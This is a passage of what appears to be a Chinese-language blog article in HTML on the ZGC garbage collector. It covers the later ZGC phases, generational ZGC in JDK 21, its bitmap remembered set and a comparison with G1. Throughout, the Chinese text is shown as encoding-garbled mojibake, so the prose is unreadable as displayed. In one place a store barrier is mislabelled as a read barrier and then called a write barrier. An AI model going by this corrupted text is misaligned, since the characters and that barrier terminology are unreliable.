<li><strong>è‡ªæ„ˆ</strong>ï¼šå¦‚æœæœ‰åº”ç”¨çº¿ç¨‹åœ¨æ­¤æ—¶è®¿é—®äº†å¯¹è±¡ï¼Œ<strong>è¯»å±éšœ</strong>ä¼šä»‹å…¥ï¼Œåˆ†æ‹…æ ‡è®°çº¿ç¨‹çš„å·¥ä½œï¼Œé¡ºä¾¿æŠŠå½“å‰å¯¹è±¡æ ‡è®°ä¸ºå­˜æ´»ï¼Œç¡®ä¿è¯»åˆ°çš„æŒ‡é’ˆæ˜¯å½“å‰è§†å›¾é¢œè‰²çš„ï¼ˆè‡ªæ„ˆï¼šå°†åæŒ‡é’ˆå˜æˆå¥½æŒ‡é’ˆï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-15">G1å’ŒZGCçš„å¹¶å‘æ ‡è®°å¯¹æ¯”</h5>
<p>G1çš„å¹¶å‘æ ‡è®°é˜¶æ®µæ˜¯ç”¨äºå¯¹è€å¹´ä»£çš„å›æ”¶ï¼Œå½“è¾¾åˆ°äº†è®¾ç½®çš„ IHOPï¼ˆè€å¹´ä»£åœ¨å †çš„å æ¯”ï¼‰ï¼Œæ¯”å¦‚45%ï¼ŒG1æ‰å¼€å§‹è§¦å‘å¹¶å‘æ ‡è®°é˜¶æ®µ
<strong>ç¼ºç‚¹</strong>ï¼šè¿™æ˜¯ä¸€ç§â€œ<strong>ååº”å¼</strong>â€çš„é€»è¾‘ã€‚å¦‚æœä½ çš„æµé‡çªç„¶æš´æ¶¨ï¼Œå†…å­˜ç¬é—´å¡«æ»¡ï¼ŒG1 å¯èƒ½æ¥ä¸åŠååº”ï¼Œç›´æ¥å¯¼è‡´ Full GCã€‚</p>
<p>ZGCå¼•å…¥äº†â€œ<strong>åˆ†é…é€Ÿç‡è‡ªé€‚åº”</strong>â€</p>
<ul>
<li><strong>åŸç†</strong>ï¼šZGC ä¼šæ ¹æ®å†å²æ•°æ®è®¡ç®—å½“å‰çš„å¯¹è±¡<strong>å¹³å‡åˆ†é…é€Ÿç‡</strong>ï¼ˆAllocation Rateï¼‰å’Œ<strong>åˆ†é…å³°å€¼</strong>ï¼ˆSpikeï¼‰ã€‚å®ƒä¼šè®¡ç®—ï¼šâ€œæŒ‰ç…§ç°åœ¨çš„åˆ†é…é€Ÿåº¦ï¼Œå †å†…å­˜è¿˜èƒ½æ’‘å¤šä¹…ï¼Ÿâ€ä»¥åŠâ€œGC å®Œæˆä¸€è½®å›æ”¶éœ€è¦å¤šä¹…ï¼Ÿâ€ã€‚å½“åˆ†é…é€Ÿç‡å˜å¿«æ—¶ï¼ŒZGC ä¼šè‡ªåŠ¨æå‰è§¦å‘ GC å‘¨æœŸï¼Œé¢„ç•™æ›´å¤šçš„ç¼“å†²ç©ºé—´ï¼Œä»¥ç¡®ä¿åœ¨å †å†…å­˜è€—å°½å‰å®Œæˆå›æ”¶ã€‚</li>
</ul>
<p><strong>è§¦å‘è§„åˆ™</strong>ï¼š</p>
<blockquote>
<p><strong>å½“ï¼ˆå‰©ä½™å¯ç”¨å†…å­˜ / åˆ†é…é€Ÿç‡ï¼‰ &lt; ï¼ˆGC è€—æ—¶ + å®‰å…¨ç¼“å†²æ—¶é—´ï¼‰ æ—¶ï¼Œç«‹å³è§¦å‘ GCã€‚</strong></p>
</blockquote>
<p>åŒæ—¶ï¼ŒZGCè¿˜å¼•å…¥äº† <strong>æµé‡æ•´å½¢(Allocation Pacing)</strong>
å½“<strong>å†…å­˜åˆ†é…é€Ÿç‡</strong>è¶…è¿‡äº†gcå›æ”¶é€Ÿç‡ï¼ŒZGC ä¸ä¼šç›´æ¥æŠ›å‡º OOM é”™è¯¯ï¼Œä¹Ÿä¸ä¼šåƒä¼ ç»Ÿ GC é‚£æ ·ç›´æ¥è¿›è¡Œé•¿æ—¶é—´çš„ Full GC åœé¡¿ã€‚ZGC ä¼šåœ¨åº”ç”¨çº¿ç¨‹<strong>ç”³è¯·å†…å­˜æ—¶</strong>å¼•å…¥å¾®å°çš„åœé¡¿ï¼Œå¼ºåˆ¶åº”ç”¨çº¿ç¨‹â€œæ…¢ä¸‹æ¥â€ã€‚é™ä½å†…å­˜åˆ†é…é€Ÿç‡ï¼Œè‡³å°‘é¿å…äº†Full GCç”šè‡³OOM</p>
<h4 data-id="heading-16">ç¬¬ä¸‰æ­¥ï¼šæ ‡è®°ç»“æŸåœé¡¿ (Pause Mark End) â€”â€” ã€STWã€‘</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼šå¤„ç†å¹¶å‘æœŸé—´é—ç•™çš„å°‘é‡è¾¹ç¼˜æƒ…å†µï¼ˆæ¯”å¦‚å¼±å¼•ç”¨ã€å¹¶å‘æœŸé—´æ–°äº§ç”Ÿçš„å¼•ç”¨å˜åŒ–ï¼‰ã€‚</li>
<li><strong>è€—æ—¶</strong>ï¼šæçŸ­ï¼ˆ1ms å·¦å³ï¼‰ã€‚</li>
<li><strong>ç»“æŸ</strong>ï¼šæ­¤æ—¶ï¼Œè°æ˜¯æ´»çš„ã€è°æ˜¯åƒåœ¾ï¼Œå·²ç»å…¨éƒ¨ç®—æ¸…æ¥šäº†ã€‚</li>
</ul>
<p><strong>å†æ ‡è®°é˜¶æ®µä¸»è¦çš„ä»»åŠ¡ï¼š</strong>
å®ƒä¸»è¦å¤„ç†é‚£äº›â€œ<strong>ä¸èƒ½é è¯»å±éšœè§£å†³</strong>â€çš„è¾¹ç¼˜æƒ…å†µï¼š</p>
<ol>
<li><strong>çº¿ç¨‹å±€éƒ¨æ ‡è®°æ ˆ (Thread-Local Mark Stacks)</strong>ï¼š
<ul>
<li>å¹¶å‘æ ‡è®°æœŸé—´ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å°æœ¬æœ¬ï¼Œè®°äº†ä¸€äº›è¿˜æ²¡æ¥å¾—åŠæäº¤åˆ°å…¨å±€çš„æ ‡è®°ä¿¡æ¯ã€‚STW æ—¶å€™è¦æ±‡æ€»ä¸€ä¸‹ã€‚</li>
</ul>
</li>
<li><strong>å¼±å¼•ç”¨/è½¯å¼•ç”¨/è™šå¼•ç”¨ (Weak/Soft/Phantom References)</strong>ï¼š
<ul>
<li>è¿™äº›å¼•ç”¨çš„å¤„ç†é€»è¾‘æ¯”è¾ƒç‰¹æ®Šï¼Œé€šå¸¸éœ€è¦åœ¨ STW ä¸‹åšæœ€ç»ˆåˆ¤å®šï¼ˆè™½ç„¶ ZGC åšäº†å¾ˆå¤šå¹¶å‘å¤„ç†ï¼Œä½†æœ€ç»ˆæ¸…ç†è¿˜æ˜¯éœ€è¦ä¸€ç‚¹ç‚¹ STW æ—¶é—´ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å­—ç¬¦ä¸²å»é‡/ç¬¦å·è¡¨æ¸…ç†</strong>ï¼š
<ul>
<li>ä¸€äº› JVM å†…éƒ¨çš„æ‚æ´»ã€‚</li>
</ul>
</li>
</ol>
<h5 data-id="heading-17">ä¸G1å†æ ‡è®°(Remark)åŒºåˆ†</h5>
<p>G1éœ€è¦ä¸€ä¸ªSTWæ—¶é—´ï¼Œå»å¤„ç†å‰©ä¸‹çš„<strong>SATBæ—¥å¿—ç¼“å†²åŒº</strong>å’Œæ‰€æœ‰æ›´æ–°ï¼Œæ‰¾å‡ºæ‰€æœ‰æœªè¢«è®¿é—®çš„å­˜æ´»å¯¹è±¡ï¼Œè¿™äº›éƒ½æ˜¯G1å¹¶å‘æ ‡è®°ä¸­ç”¨æˆ·çº¿ç¨‹æ“ä½œå¯¹è±¡å¯¼è‡´çš„ï¼Œæ˜¯å®æ‰“å®çš„éœ€è¦é‡æ–°æ›´æ–°çš„å¯¹è±¡</p>
<h4 data-id="heading-18">ç¬¬å››æ­¥ï¼šå¹¶å‘å‡†å¤‡ (Concurrent Prepare for Relocate) â€”â€” ã€å¹¶å‘ã€‘</h4>
<p><strong>å¹²ä»€ä¹ˆ</strong>ï¼š
1. <strong>é€‰å‡ºé‡åˆ†é…é›†ï¼ˆRelocation Setï¼‰</strong>ï¼šæŒ‘å‡ºé‚£äº›<strong>åƒåœ¾æœ€å¤šçš„ Page</strong>ï¼Œå‡†å¤‡å›æ”¶å®ƒä»¬ã€‚
2. <strong>åˆ›å»ºè½¬å‘è¡¨ï¼ˆForwarding Tableï¼‰</strong>ï¼šä¸ºè¿™äº› Page åˆå§‹åŒ–ä¸€å¼ è¡¨ï¼Œç”¨æ¥è®°å½•â€œæ—§åœ°å€ -&gt; æ–°åœ°å€â€çš„æ˜ å°„ã€‚</p>
<h4 data-id="heading-19">ç¬¬äº”æ­¥ï¼šåˆå§‹è½¬ç§» (Pause Relocate Start) â€”â€” ã€STWã€‘</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼š<strong>åªæ¬è¿</strong>Â è¢«Â <strong>æ ¹èŠ‚ç‚¹</strong>Â ç›´æ¥å¼•ç”¨çš„å¯¹è±¡ï¼ˆä¸”è¿™äº›å¯¹è±¡åœ¨é‡åˆ†é…é›†ä¸­ï¼‰ã€‚</li>
<li><strong>ä¸ºä»€ä¹ˆåœé¡¿</strong>ï¼šå› ä¸ºè¦ä¿®æ”¹çº¿ç¨‹æ ˆé‡Œçš„æŒ‡é’ˆï¼Œå¿…é¡»æš‚åœã€‚</li>
<li><strong>è€—æ—¶</strong>ï¼šæçŸ­ï¼ˆå› ä¸ºæ ¹å¼•ç”¨çš„å¯¹è±¡å¾ˆå°‘ï¼‰ã€‚</li>
<li><strong>ç»“æœ</strong>ï¼šæ ¹èŠ‚ç‚¹ç°åœ¨éƒ½æŒ‡å‘äº†æ–°åœ°å€ï¼ˆRemapped çŠ¶æ€ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-20">ç¬¬å…­æ­¥ï¼šå¹¶å‘è½¬ç§» (Concurrent Relocation) â€”â€” ã€å¹¶å‘ã€‘</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼šæŠŠé‡åˆ†é…é›†é‡Œå‰©ä¸‹çš„æ´»å¯¹è±¡ï¼Œæ¬è¿åˆ°æ–° Page ä¸­ã€‚</li>
<li><strong>è‡ªæ„ˆ</strong>ï¼š
<ul>
<li><strong>æ¬å®¶</strong>ï¼šGC çº¿ç¨‹åœ¨åå°æ¬ã€‚</li>
<li><strong>æ‹¦æˆª</strong>ï¼šå¦‚æœç”¨æˆ·çº¿ç¨‹è®¿é—®äº†è¿˜æ²¡æ¬èµ°çš„å¯¹è±¡ï¼Œ<strong>è¯»å±éšœ</strong>æ‹¦æˆªï¼Œåˆ†æ‹…gcçº¿ç¨‹çš„å·¥ä½œï¼Œé¡ºä¾¿å¸®å¿™æ¬èµ°ï¼Œå¹¶ä¿®æ­£æŒ‡é’ˆï¼ˆè‡ªæ„ˆï¼Œä¸å¹¶å‘æ ‡è®°é˜¶æ®µçš„è‡ªæ„ˆä¸€æ ·ï¼Œéƒ½æ˜¯ä¿®å¤æŒ‡é’ˆï¼‰ã€‚</li>
<li><strong>è®°å½•</strong>ï¼šæ¬è¿å…³ç³»è®°å½•åœ¨<strong>è½¬å‘è¡¨</strong>ä¸­ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-21">ç¬¬ä¸ƒæ­¥ï¼šå¹¶å‘é‡æ˜ å°„ (Concurrent Remap) â€”â€” ã€å¹¶å‘ã€‘ï¼ˆé€šå¸¸åˆå¹¶åˆ°ä¸‹ä¸€æ¬¡ GC çš„æ ‡è®°é˜¶æ®µï¼‰</h4>
<ul>
<li><strong>å¹²ä»€ä¹ˆ</strong>ï¼šä¿®æ­£å †ä¸­æ‰€æœ‰æŒ‡å‘æ—§åœ°å€çš„æŒ‡é’ˆã€‚</li>
<li><strong>è¯´æ˜</strong>ï¼šZGC å¾ˆæ‡’ã€‚å¯¹è±¡æ¬èµ°äº†ï¼Œè½¬å‘è¡¨ä¹Ÿè®°äº†ï¼Œä½†å †é‡Œå¯èƒ½è¿˜æœ‰å‡ ç™¾ä¸‡ä¸ªæŒ‡é’ˆæŒ‡å‘æ—§åœ°å€ã€‚ZGC ä¸ä¼šä¸“é—¨èŠ±æ—¶é—´å»ä¿®å®ƒä»¬ï¼Œè€Œæ˜¯<strong>ç•™åˆ°ä¸‹ä¸€æ¬¡ GC çš„â€œå¹¶å‘æ ‡è®°â€é˜¶æ®µ</strong>ï¼Œé¡ºè·¯çœ‹åˆ°ä¸€ä¸ªä¿®ä¸€ä¸ªã€‚</li>
<li><strong>ç»“æœ</strong>ï¼šå½“æ‰€æœ‰æŒ‡é’ˆéƒ½ä¿®å¥½äº†ï¼Œ<strong>æ—§ Page</strong> å’Œ<strong>è½¬å‘è¡¨</strong>æ‰èƒ½çœŸæ­£é‡Šæ”¾ã€‚</li>
</ul>
<hr/>
<p>ZGCåªæœ‰ä¸‰ä¸ªSTWé˜¶æ®µï¼š<strong>åˆå§‹æ ‡è®°</strong>ï¼Œ<strong>å†æ ‡è®°</strong>ï¼Œ<strong>åˆå§‹è½¬ç§»</strong>ã€‚å…¶ä¸­ï¼Œåˆå§‹æ ‡è®°å’Œåˆå§‹è½¬ç§»åˆ†åˆ«éƒ½åªéœ€è¦æ‰«ææ‰€æœ‰GC Rootsï¼Œå…¶å¤„ç†æ—¶é—´å’ŒGC Rootsçš„æ•°é‡æˆæ­£æ¯”ï¼Œä¸€èˆ¬æƒ…å†µè€—æ—¶éå¸¸çŸ­ï¼›å†æ ‡è®°é˜¶æ®µSTWæ—¶é—´å¾ˆçŸ­,ä¸€èˆ¬æœ€å¤š1msï¼Œè¶…è¿‡1msåˆ™å†æ¬¡è¿›å…¥å¹¶å‘æ ‡è®°é˜¶æ®µã€‚</p>
<h2 data-id="heading-22">åˆ†ä»£ZGC (Gen ZGC)</h2>
<p>åˆ†ä»£zgcäºjdk21è¢«æ­£å¼å¼•å…¥ï¼Œåˆ†ä»£zgcçš„å‡ºç°ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸ºäº†è§£å†³ <strong>â€œå¼±åˆ†ä»£å‡è¯´ï¼ˆWeak Generational Hypothesisï¼‰â€</strong> åœ¨ä¸åˆ†ä»£ ZGCä¸­æ— æ³•è¢«åˆ©ç”¨è€Œå¯¼è‡´çš„æ•ˆç‡ç“¶é¢ˆã€‚ï¼ˆäººè¯ï¼šé‡ç‚¹æ‰«å¹´è½»ä»£ï¼Œå¶å°”ä¸€èµ·æ‰«è€å¹´ä»£ï¼‰</p>
<p>åˆ†ä»£zgcå¯¹äºä¸åˆ†ä»£zgcï¼šååé‡æå‡<strong>4å€</strong>ã€å†…å­˜éœ€æ±‚é™ä½30%ï¼ŒAllocation Stallé™ä½85%ã€‚</p>
<h3 data-id="heading-23">è§£å†³ä¸åˆ†ä»£ZGCçš„ç—›ç‚¹</h3>
<ol>
<li>â€œ<strong>åˆ†é…é€Ÿç‡ä¸Šé™ï¼ˆAllocation Stallï¼‰</strong>â€é—®é¢˜
<ul>
<li><strong>éåˆ†ä»£ ZGC çš„é—®é¢˜</strong>ï¼š
<ul>
<li>å› ä¸ºä¸åˆ†ä»£ï¼ŒZGC æ¯æ¬¡å›æ”¶éƒ½å¿…é¡»æ‰«æ<strong>å…¨å †</strong>ã€‚</li>
<li>å¦‚æœä½ çš„åº”ç”¨ç‹‚åˆ›å»ºå¯¹è±¡ï¼ˆé«˜åˆ†é…é€Ÿç‡ï¼‰ï¼Œè€Œ ZGC æ‰«æå…¨å †çš„é€Ÿåº¦èµ¶ä¸ä¸Šgcçš„é€Ÿåº¦ï¼Œå†…å­˜å°±ä¼šè¢«å¡«æ»¡ã€‚</li>
<li><strong>åæœ</strong>ï¼šè§¦å‘Â <strong>Allocation Stall</strong>ï¼Œå¼ºåˆ¶æš‚åœåº”ç”¨çº¿ç¨‹ï¼Œç›´åˆ°è…¾å‡ºç©ºé—´ã€‚è¿™ä¼šå¯¼è‡´åŸæœ¬æ‰¿è¯ºçš„ &lt;1ms åœé¡¿å˜æˆå‡ ç™¾æ¯«ç§’ç”šè‡³æ›´ä¹…ã€‚</li>
</ul>
</li>
<li><strong>åˆ†ä»£ ZGC çš„è§£å†³</strong>ï¼š
<ul>
<li>å¼•å…¥<strong>å¹´è½»ä»£</strong>ã€‚ç»å¤§å¤šæ•°å¯¹è±¡æ˜¯â€œæœç”Ÿå¤•æ­»â€çš„ã€‚</li>
<li>ZGC åªéœ€è¦é«˜é¢‘ã€å¿«é€Ÿåœ°æ‰«æè¿™ä¸€å°å—åŒºåŸŸï¼Œå°±èƒ½å›æ”¶æ‰ 90% ä»¥ä¸Šçš„åƒåœ¾ã€‚</li>
<li><strong>æ•ˆæœ</strong>ï¼šå›æ”¶é€Ÿåº¦å¤§å¹…æå‡ï¼Œèƒ½æ‰›ä½æé«˜çš„å¯¹è±¡åˆ†é…é€Ÿç‡ï¼Œä¸å†å®¹æ˜“â€œå¡å£³â€ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>CPU èµ„æºåˆ©ç”¨ç‡ä½
<ul>
<li><strong>éåˆ†ä»£ ZGC çš„é—®é¢˜</strong>ï¼š
<ul>
<li><strong>é™ªè·‘ç°è±¡</strong>ï¼šè€å¹´ä»£å¯¹è±¡é€šå¸¸é•¿æœŸå­˜æ´»ã€‚åœ¨éåˆ†ä»£ ZGC ä¸­ï¼Œæ¯æ¬¡ GC éƒ½è¦å»æ‰«æã€æ ‡è®°ã€é‡å®šä½è¿™äº›<strong>æ ¹æœ¬æ²¡å˜</strong>çš„è€å¯¹è±¡</li>
<li>è¿™æµªè´¹äº†å¤§é‡çš„ CPU èµ„æº</li>
</ul>
</li>
<li><strong>åˆ†ä»£ ZGC çš„è§£å†³</strong>ï¼š
<ul>
<li><strong>å¿½ç•¥è€å¹´ä»£</strong>ï¼šåœ¨ Minor GC æœŸé—´ï¼Œå®Œå…¨ä¸çœ‹ Old Genï¼ˆé™¤éæœ‰è·¨ä»£å¼•ç”¨ï¼‰ï¼ŒCPU èµ„æºå…¨èšç„¦åœ¨â€œåƒåœ¾æœ€å¤šâ€çš„ Young Genã€‚</li>
<li><strong>ç»“æœ</strong>ï¼šè…¾å‡ºäº†æ›´å¤š CPU ç»™ä¸šåŠ¡çº¿ç¨‹ï¼Œ<strong>ååé‡æå‡æ˜¾è‘—</strong>ï¼ˆé€šå¸¸æå‡ 10%~20% ä»¥ä¸Šï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>å†…å­˜å¼€é”€è¿‡å¤§
<ul>
<li><strong>éåˆ†ä»£ ZGC çš„é—®é¢˜</strong>ï¼š
<ul>
<li>ä¸ºäº†ç»´æŒä½å»¶è¿Ÿï¼Œéåˆ†ä»£ ZGC éœ€è¦é¢„ç•™è¾ƒå¤§çš„<strong>å †ç©ºé—´ç¼“å†²</strong>ï¼Œå¦åˆ™å®¹æ˜“æ¥ä¸åŠå›æ”¶(Allocation Stallé—®é¢˜ï¼‰ã€‚é€šå¸¸å»ºè®®å †å¤§å°è¦æ¯”å®é™…ä½¿ç”¨é‡å¤§ 2-3 å€ã€‚</li>
<li>åº•å±‚ä½¿ç”¨å¤šé‡æ˜ å°„(M0 M1 Remapped)ï¼Œè™½ç„¶ç‰©ç†å†…å­˜ä¸æµªè´¹ï¼Œä½†<strong>è™šæ‹Ÿå†…å­˜åœ°å€</strong>å ç”¨æå¤§ã€‚</li>
</ul>
</li>
<li><strong>åˆ†ä»£ ZGC çš„è§£å†³</strong>ï¼š
<ul>
<li>å› ä¸ºå›æ”¶æ•ˆç‡é«˜ï¼Œä¸éœ€è¦é¢„ç•™é‚£ä¹ˆå¤§çš„ <strong>å †ç©ºé—´ç¼“å†²</strong> ä¹Ÿèƒ½è·‘å¾—ç¨³ã€‚</li>
<li><strong>ç›¸åŒå †å¤§å°ä¸‹ï¼Œåˆ†ä»£ ZGC èƒ½æ‰¿è½½æ›´å¤šçš„ä¸šåŠ¡è´Ÿè½½</strong>ï¼›æˆ–è€…è¯´ï¼ŒåŒæ ·çš„ä¸šåŠ¡è´Ÿè½½ï¼Œåˆ†ä»£ ZGC å¯ä»¥ç”¨æ›´å°çš„å †è·‘èµ·æ¥ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>å•æ¬¡ GC å‘¨æœŸè¿‡é•¿
<ul>
<li><strong>éåˆ†ä»£ ZGC çš„é—®é¢˜</strong>ï¼š
<ul>
<li><strong>GC å‘¨æœŸè€—æ—¶</strong>ä¸<strong>å †ä¸­å­˜æ´»å¯¹è±¡çš„æ€»æ•°é‡</strong>æˆæ­£æ¯”ã€‚å¦‚æœå­˜æ´»å¯¹è±¡å¤šï¼ˆæ¯”å¦‚å‡ å GB çš„ç¼“å­˜ï¼‰ï¼Œä¸€è½® GC å¯èƒ½è¦è·‘å¥½å‡ ç§’ç”šè‡³æ›´ä¹…ã€‚</li>
<li>è™½ç„¶åœé¡¿ï¼ˆSTWï¼‰å¾ˆçŸ­ï¼Œä½† GC çº¿ç¨‹é•¿æ—¶é—´å ç”¨ CPUï¼Œä¼šæŒç»­å¹²æ‰°ä¸šåŠ¡ã€‚</li>
</ul>
</li>
<li><strong>åˆ†ä»£ ZGC çš„è§£å†³</strong>ï¼š
<ul>
<li>Minor GC çš„è€—æ—¶åªä¸<strong>Young Gen é‡Œçš„å­˜æ´»å¯¹è±¡</strong>æœ‰å…³ï¼Œé€šå¸¸æçŸ­ã€‚</li>
<li>GC å˜æˆäº†â€œçŸ­å¹³å¿«â€çš„èŠ‚å¥ã€‚</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">åˆ†ä»£æ¨¡å‹</h3>
<p>åœ¨éåˆ†ä»£ ZGC ä¸­ï¼ŒPage åªæœ‰å¤§å°ä¹‹åˆ†ï¼ˆSmall/Medium/Large Pageï¼‰ã€‚ åœ¨åˆ†ä»£ ZGC ä¸­ï¼ŒPage é™¤äº†å¤§å°ï¼Œè¿˜å¤šäº†<strong>ä»£ï¼ˆGenerationï¼‰</strong> çš„å±æ€§ã€‚</p>
<ul>
<li><strong>Young Generation Pages</strong>ï¼ˆæ–°ç”Ÿä»£ï¼‰ï¼š
<ul>
<li>å­˜æ”¾æ–°åˆ†é…çš„å¯¹è±¡ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåˆ†é…é€Ÿåº¦æå¿«ï¼Œå›æ”¶é¢‘ç‡æé«˜ã€‚</li>
<li><strong>åŒºåˆ«</strong>ï¼šè¿™é‡Œä¸å†éœ€è¦åƒ G1 é‚£æ ·å¤æ‚çš„ Region Setï¼ŒZGC ä¾ç„¶ç”¨ Page ç®¡ç†ï¼Œä½†è¿™äº› Page è¢«æ‰“ä¸Šäº†â€œYoungâ€çš„æ ‡ç­¾ã€‚</li>
</ul>
</li>
<li><strong>Old Generation Pages</strong>ï¼ˆè€å¹´ä»£ï¼‰ï¼š
<ul>
<li>å­˜æ”¾ä» Young Gen æ™‹å‡è¿‡æ¥çš„é•¿å¯¿å¯¹è±¡ã€‚</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼šåªæœ‰åœ¨ Major GC æ—¶æ‰ä¼šè¢«æ‰«æã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-25">RSetï¼ˆRemembered Setï¼‰</h4>
<p>å¼•å…¥ <strong>RSetï¼ˆRemembered Setï¼‰</strong> æ¥è§£å†³è·¨ä»£å¼•ç”¨ï¼ŒRSetæ˜¯åˆ†ä»£gcçš„é€šç”¨åšæ³•ï¼Œç›®çš„æ˜¯ä¸ºäº†åœ¨è¿›è¡Œ Minor GC æ—¶ï¼Œä¸ç”¨æ‰«ææ•´ä¸ªè€å¹´ä»£ã€‚</p>
<p>å¯¹æ¯”<strong>G1</strong>çš„RSetï¼šå“ˆå¸Œè¡¨ + å¡è¡¨ï¼Œæ¯ä¸ª Region éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ RSetï¼ˆå“ˆå¸Œè¡¨ï¼‰,éœ€è¦è®°å½•â€œ<strong>è°å¼•ç”¨äº†æˆ‘</strong>â€ï¼Œä¾‹å¦‚ï¼ŒRegion B çš„ RSet ä¼šè®°å½•ï¼šâ€œRegion A çš„ç¬¬ 5 å¼ å¡ç‰‡å¼•ç”¨äº†æˆ‘â€ï¼Œè¿™æ ·åšå†…å­˜å ç”¨é«˜ï¼Œä¸”ç»´æŠ¤æ›´åŠ æ˜‚è´µï¼ˆéœ€è¦ä¸€ä¸ªä¼˜åŒ–çº¿ç¨‹ä¸æ–­å¤„ç†å†™å±éšœäº§ç”Ÿçš„è„å¡ç‰‡ï¼‰</p>
<p><strong>åˆ†ä»£ZGC</strong> çš„ RSetï¼š<strong>åŒé‡ç¼“å†²ä½å›¾ï¼ˆDouble-Buffered Bitmapsï¼‰</strong>ï¼Œç²¾åº¦æ˜¯<strong>ç²¾ç¡®åˆ°å…·ä½“çš„å¯¹è±¡å­—æ®µåœ°å€</strong></p>
<ul>
<li><strong>ç»“æ„</strong>ï¼š<strong>æ²¡æœ‰å…¨å±€å¡è¡¨ï¼Œä¹Ÿæ²¡æœ‰ç‹¬ç«‹çš„å“ˆå¸Œè¡¨</strong>ã€‚
<ul>
<li>å®ƒä¾èµ–çš„æ˜¯æŒ‚åœ¨æ¯ä¸ªè€å¹´ä»£åˆ†é¡µï¼ˆZPageï¼‰ä¸Šçš„ **åŒé‡ç¼“å†²ä½å›¾ã€‚</li>
<li>æ¯ä¸ªåˆ†é¡µæœ‰ä¸¤å¥—ä½å›¾ï¼šä¸€å¥—ç»™<strong>åº”ç”¨çº¿ç¨‹å†™</strong>ï¼Œä¸€å¥—ç»™ <strong>GC çº¿ç¨‹è¯»</strong>ã€‚</li>
</ul>
</li>
<li><strong>è®°å½•å†…å®¹</strong>ï¼š
<ul>
<li><strong>ä¸æ˜¯</strong>è®°å½•â€œå“ªå—å†…å­˜(Card)è„äº†â€ï¼ˆç²—ç²’åº¦ï¼‰ã€‚</li>
<li><strong>è€Œæ˜¯</strong>ç²¾ç¡®è®°å½•â€œ<strong>è€å¹´ä»£å¯¹è±¡ä¸­ï¼Œå“ªä¸ªå…·ä½“å­—æ®µæŒæœ‰å¹´è½»ä»£çš„å¼•ç”¨</strong>â€ã€‚</li>
<li><strong>ç²¾åº¦</strong>ï¼š1 ä¸ª bit å¯¹åº”å†…å­˜ä¸­ä¸€ä¸ªå¯èƒ½çš„æŒ‡é’ˆä½ç½®ï¼ˆç²¾ç¡®åº¦æé«˜ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å·¥ä½œæµç¨‹ï¼ˆåŒé‡ç¼“å†²æœºåˆ¶ï¼‰</strong>ï¼š
<ol>
<li><strong>åº”ç”¨çº¿ç¨‹</strong>ï¼šé€šè¿‡å†™å±éšœï¼Œç›´æ¥åœ¨å½“å‰çš„ä½å›¾ä¸Šæ ‡è®°å…·ä½“çš„å­—æ®µåœ°å€</li>
<li><strong>GC å¼€å§‹æ—¶</strong>ï¼šåŸå­äº¤æ¢ä¸¤ä¸ªä½å›¾</li>
<li><strong>GC çº¿ç¨‹</strong>ï¼šè¯»å–åˆšæ‰å†™æ»¡çš„ä½å›¾ï¼Œæ‰«æç²¾ç¡®çš„åœ°å€ï¼Œæ— éœ€æ‰«æå‘¨å›´æ— å…³å†…å­˜</li>
</ol>
</li>
<li><strong>ä¼˜åŠ¿</strong>ï¼š
<ul>
<li><strong>æ— å¹¶å‘å†²çª</strong>ï¼šåº”ç”¨çº¿ç¨‹å’Œ GC çº¿ç¨‹æ“ä½œä¸åŒçš„ä½å›¾ï¼Œä¸éœ€è¦é”ï¼Œä¹Ÿä¸éœ€è¦å†…å­˜å±éšœ</li>
<li><strong>æ— éœ€åå°çº¿ç¨‹</strong></li>
<li><strong>æ‰«ææå¿«</strong>ï¼šå› ä¸ºè®°å½•çš„æ˜¯ç²¾ç¡®åœ°å€ï¼ŒGC æ‰«ææ—¶å¯ä»¥ç›´æ¥å®šä½ï¼Œä¸åƒå¡è¡¨é‚£æ ·æ‰«æä¸€æ•´ä¸ªCardçš„èŒƒå›´ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-26">å¤„ç†è·¨ä»£</h4>
<p>ç”±ä¸Šä¸€èŠ‚å¯çŸ¥ï¼šåˆ†ä»£ZGCé€šè¿‡RSetæ¥è§£å†³è·¨ä»£å¼•ç”¨é—®é¢˜ï¼Œåˆ†ä»£ZGCå¯¹äºä¸åˆ†ä»£ZGCï¼Œè¿˜æ–°å¢äº†<strong>è¯»å±éšœ(Store Barrier)</strong>ï¼Œå½“ä¸€ä¸ª<strong>è€å¹´ä»£å¯¹è±¡</strong>æ–°å¢äº†å¯¹<strong>å¹´è½»ä»£å¯¹è±¡</strong>çš„å¼•ç”¨æŒ‡é’ˆæ—¶ï¼ˆ<code>oldObj.var = youngObj</code>ï¼‰,å†™å±éšœä¼šä»‹å…¥ï¼Œå®ƒä¼šå…ˆæ£€æŸ¥å½“å‰å¯¹è±¡ï¼ˆoldObjï¼‰æ˜¯å¦åœ¨è€å¹´ä»£ï¼Œå¦‚æœæ˜¯è€å¹´ä»£å¯¹è±¡ï¼Œç›´æ¥åœ¨<strong>ä½å›¾</strong>ä¸ŠæŠŠè¿™ä¸ª<strong>è€å¹´ä»£å¯¹è±¡çš„è¿™ä¸ªå¼•ç”¨å­—æ®µ</strong>å¯¹åº”çš„<strong>ä½</strong>æ ‡è®°ä¸º1ï¼Œå¼€é”€å¾ˆå°ã€‚</p>
